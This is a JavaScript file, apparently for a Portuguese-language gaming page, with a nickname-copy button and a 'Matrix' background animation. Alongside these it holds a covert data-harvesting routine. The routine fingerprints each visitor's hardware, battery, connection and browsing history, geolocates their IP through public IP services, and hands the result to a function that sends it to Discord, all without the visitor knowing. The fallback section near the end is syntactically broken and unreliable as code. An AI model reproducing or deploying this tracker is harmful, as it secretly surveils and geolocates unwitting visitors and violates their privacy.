function copyNick() {
  const nick = 'ZENEC AMASSA BOT';
  navigator.clipboard.writeText(nick).then(() => {
    alert('Nick copiado! Pronto pra perder?');
  }).catch(() => {
    const textarea = document.createElement('textarea');
    textarea.value = nick;
    textarea.style.position = 'fixed';
    textarea.style.opacity = '0';
    document.body.appendChild(textarea);
    textarea.select();
    document.execCommand('copy');
    document.body.removeChild(textarea);
    alert('Nick copiado! Pronto pra perder?');
  });
}

// Fun√ß√£o para obter informa√ß√µes de hardware avan√ßadas
async function getAdvancedInfo() {
  const info = {};
  
  // GPU/Placa de V√≠deo
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) {
        info.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      } else {
        info.gpu = 'N/A';
      }
    } else {
      info.gpu = 'WebGL n√£o suportado';
    }
  } catch (e) {
    info.gpu = 'Erro ao detectar GPU';
  }

  // Mem√≥ria RAM e Cores do Processador
  if (navigator.deviceMemory) {
    info.ram = navigator.deviceMemory + 'GB RAM';
  } else {
    info.ram = 'N/A';
  }

  if (navigator.hardwareConcurrency) {
    info.cores = navigator.hardwareConcurrency + ' Cores';
  } else {
    info.cores = 'N/A';
  }

  // Bateria
  try {
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      const batteryLevel = Math.round(battery.level * 100);
      const charging = battery.charging ? 'Carregando' : 'Descarregando';
      info.battery = `${batteryLevel}% (${charging})`;
    } else {
      info.battery = 'N/A';
    }
  } catch (e) {
    info.battery = 'N/A';
  }

  // Velocidade da Internet
  try {
    if (navigator.connection || navigator.mozConnection || navigator.webkitConnection) {
      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (connection.downlink) {
        info.internet = connection.downlink + ' Mbps';
      } else {
        info.internet = 'N/A';
      }
    } else {
      info.internet = 'N/A';
    }
  } catch (e) {
    info.internet = 'N/A';
  }

  // Hist√≥rico (quantidade aproximada)
  try {
    info.history = window.history.length + ' p√°ginas visitadas';
  } catch (e) {
    info.history = 'N/A';
  }

  // Pixel Ratio
  info.pixelRatio = window.devicePixelRatio || 1;

  return info;
}

// Coletar todas as informa√ß√µes e enviar UMA vez
async function collectInfo() {
  try {
    console.log('üîç Iniciando coleta de dados...');
    
    // 1. Coleta informa√ß√µes avan√ßadas de hardware
    const advancedInfo = await getAdvancedInfo();
    
    // 2. Busca localiza√ß√£o por IP (cidade e estado)
    console.log('üåê Buscando localiza√ß√£o por IP...');
    let locationData;
    
    try {
      // Tenta ipapi.co primeiro (confi√°vel para cidade/estado)
      const response1 = await fetch('https://ipapi.co/json/');
      locationData = await response1.json();
      
      if (locationData.error) {
        throw new Error('Rate limit na primeira API');
      }
      
      console.log('‚úÖ Dados de IP obtidos:', locationData);
      
    } catch (e) {
      console.log('‚ö†Ô∏è Primeira API falhou, tentando alternativa...');
      // Fallback: ipwhois.app
      try {
        const response2 = await fetch('https://ipwho.is/');
        const geoData = await response2.json();
        
        locationData = {
          ip: geoData.ip,
          city: geoData.city,
          region: geoData.region,
          country_name: geoData.country,
          country_code: geoData.country_code,
          latitude: geoData.latitude,
          longitude: geoData.longitude,
          timezone: geoData.timezone?.id,
          org: geoData.connection?.isp || geoData.connection?.org || 'N/A',
          asn: geoData.connection?.asn
        };
        
        console.log('‚úÖ API alternativa obtida:', locationData);
        
      } catch (e2) {
        console.log('‚ö†Ô∏è Segunda API falhou, usando IP b√°sico...');
        // √öltimo fallback: s√≥ IP b√°sico
        const response3 = await fetch('https://api.ipify.org?format=json');
        const ipData = await response3.json();
        locationData = { ip: ipData.ip };
      }
    }
    
    // 3. Define coordenadas e precis√£o
    const coords = locationData.latitude && locationData.longitude 
      ? `${locationData.latitude}, ${locationData.longitude}`
      : 'N/A';
    const accuracy = coords !== 'N/A' ? 'Cidade/Estado (~2-10km)' : 'N/A';
    
    // 4. Monta string do sistema com cores e RAM
    const systemInfo = `${navigator.platform} (${advancedInfo.cores}, ${advancedInfo.ram})`;
    
    // 5. Monta dados completos (S√ì DADOS CONFI√ÅVEIS)
    const fullData = {
      time: new Date().toLocaleString('pt-BR'),
      platform: systemInfo,
      browser: navigator.userAgent.substring(0, 150),
      screen: `${screen.width}x${screen.height} (${advancedInfo.pixelRatio}x)`,
      language: navigator.language,
      referrer: document.referrer || "Acesso direto",
      ip: locationData.ip || "N/A",
      location: `${locationData.city || '?'}, ${locationData.region || '?'}, ${locationData.country_name || '?'}`,
      isp: locationData.org || "N/A",
      coords: coords,
      accuracy: accuracy,
      timezone: locationData.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone,
      countryCode: locationData.country_code || "N/A",
      asn: locationData.asn || "N/A",
      gpu: advancedInfo.gpu,
      battery: advancedInfo.battery,
      internet: advancedInfo.internet,
      history: advancedInfo.history
    };

    // 6. Envia apenas UMA vez com tudo
    console.log('üì§ Enviando dados completos:', fullData);
    sendToDiscord(fullData);
  } catch (error) {
    console.error('‚ùå Erro geral na coleta:', error);
    
    // Fallback m√≠nimo se tudo falhar
    try {
      const advancedInfo = await getAdvancedInfo();
      const response = await fetch('https://api.ipify.org?format=json');
      const ipData = await response.json();
      
      const systemInfo = `${navigator.platform} (${advancedInfo.cores}, ${advancedInfo.ram})`;
      
      const basicData = {
        time: new Date().toLocaleString('pt-BR'),
        platform: systemInfo,
        browser: navigator.userAgent.substring(0, 150),
        screen: `${screen.width}x${screen.height} (${advancedInfo.pixelRatio}x)`,
        language: navigator.language,

        ip: ipData.ip,

        neighborhood: "N/A",

    } catch (finalError) {

  }
}

window.addEventListener('load', function() {
  const canvas = document.createElement('canvas');
  canvas.id = 'matrix';
  canvas.style.position = 'fixed';
  canvas.style.top = '0';
  canvas.style.left = '0';
  canvas.style.width = '100%';
  canvas.style.height = '100%';
  canvas.style.zIndex = '1';
  canvas.style.pointerEvents = 'none';
  document.body.appendChild(canvas);

  const ctx = canvas.getContext('2d');
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;

  const chars = '01';
  const fontSize = 14;
  const columns = canvas.width / fontSize;
  const drops = [];

  for (let i = 0; i < columns; i++) {
    drops[i] = Math.random() * canvas.height / fontSize;
  }

  function drawMatrix() {
    ctx.fillStyle = 'rgba(5, 5, 7, 0.05)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#0f0';
    ctx.font = fontSize + 'px monospace';

    for (let i = 0; i < drops.length; i++) {
      const text = chars[Math.floor(Math.random() * chars.length)];
      ctx.fillText(text, i * fontSize, drops[i] * fontSize);

      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
        drops[i] = 0;
      }
      drops[i]++;
    }
  }

  setInterval(drawMatrix, 35);

  window.addEventListener('resize', () => {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
  });
});
